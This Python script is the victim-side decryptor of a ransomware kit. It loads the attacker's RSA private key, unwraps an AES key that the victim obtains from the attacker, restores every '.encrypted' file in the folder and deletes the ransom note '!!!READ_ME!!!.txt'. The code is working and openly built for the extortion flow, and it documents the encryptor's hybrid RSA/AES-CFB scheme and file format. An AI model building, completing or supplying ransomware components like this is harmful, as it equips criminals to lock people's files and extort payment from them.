"""
File Decryptor for Victims
Run this after getting key from attacker
"""

import os
import base64
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

print("="*60)
print("🔓 FILE DECRYPTOR")
print("Recover encrypted files with key from attacker")
print("="*60)

class FileDecryptor:
    def __init__(self):
        self.private_key = None
        
    def load_private_key(self, key_path="private_key.pem"):
        """Load the attacker's private key"""
        try:
            with open(key_path, "rb") as f:
                self.private_key = serialization.load_pem_private_key(
                    f.read(),
                    password=None,
                    backend=default_backend()
                )
            print("[✓] Private key loaded")
            return True
        except:
            print("[✗] Could not load private_key.pem")
            print("    Make sure you have the key from attacker")
            return False
    
    def decrypt_aes_key(self, encrypted_key_b64):
        """Decrypt AES key using RSA private key"""
        encrypted_key = base64.b64decode(encrypted_key_b64)
        
        decrypted_key = self.private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return decrypted_key
    
    def find_encrypted_files(self):
        """Find all .encrypted files"""
        encrypted_files = []
        for file in os.listdir('.'):
            if file.endswith('.encrypted'):
                encrypted_files.append(file)
        return encrypted_files
    
    def decrypt_file(self, encrypted_file, aes_key):
        """Decrypt a single file"""
        try:
            # Read encrypted file
            with open(encrypted_file, 'rb') as f:
                data = f.read()
            
            # Extract IV (first 16 bytes) and encrypted data
            iv = data[:16]
            encrypted_data = data[16:]
            
            # Create AES cipher
            cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
            decryptor = cipher.decryptor()
            
            # Decrypt data
            decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
            
            # Save decrypted file (remove .encrypted extension)
            original_name = encrypted_file.replace('.encrypted', '')
            with open(original_name, 'wb') as f:
                f.write(decrypted_data)
            
            # Remove encrypted file
            os.remove(encrypted_file)
            
            print(f"[✓] Decrypted: {original_name}")
            return True
            
        except Exception as e:
            print(f"[✗] Failed to decrypt {encrypted_file}: {e}")
            return False
    
    def run(self):
        """Main decryption process"""
        # Load private key
        if not self.load_private_key():
            return
        
        # Get encrypted AES key from user
        encrypted_key_b64 = input("\nEnter encrypted AES key from attacker: ").strip()
        if not encrypted_key_b64:
            print("No key provided!")
            return
        
        # Decrypt AES key
        try:
            aes_key = self.decrypt_aes_key(encrypted_key_b64)
            print("[✓] AES key decrypted successfully")
        except:
            print("[✗] Invalid key!")
            return
        
        # Find encrypted files
        encrypted_files = self.find_encrypted_files()
        if not encrypted_files:
            print("No encrypted files found!")
            return
        
        print(f"\nFound {len(encrypted_files)} encrypted files")
        
        # Decrypt all files
        success_count = 0
        for file in encrypted_files:
            if self.decrypt_file(file, aes_key):
                success_count += 1
        
        print(f"\n✅ Successfully decrypted {success_count}/{len(encrypted_files)} files")
        
        # Remove ransom note
        if os.path.exists("!!!READ_ME!!!.txt"):
            os.remove("!!!READ_ME!!!.txt")
            print("[✓] Removed ransom note")

def main():
    print("\nINSTRUCTIONS:")
    print("1. Get the encrypted AES key from the attacker")
    print("2. Make sure private_key.pem is in same folder")
    print("3. Run this decryptor")
    print("4. Enter the encrypted key when prompted")
    print("\n" + "-"*40)
    
    confirm = input("Ready to decrypt? (yes/no): ").lower()
    if confirm == 'yes':
        decryptor = FileDecryptor()
        decryptor.run()
    else:
        print("Cancelled.")
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()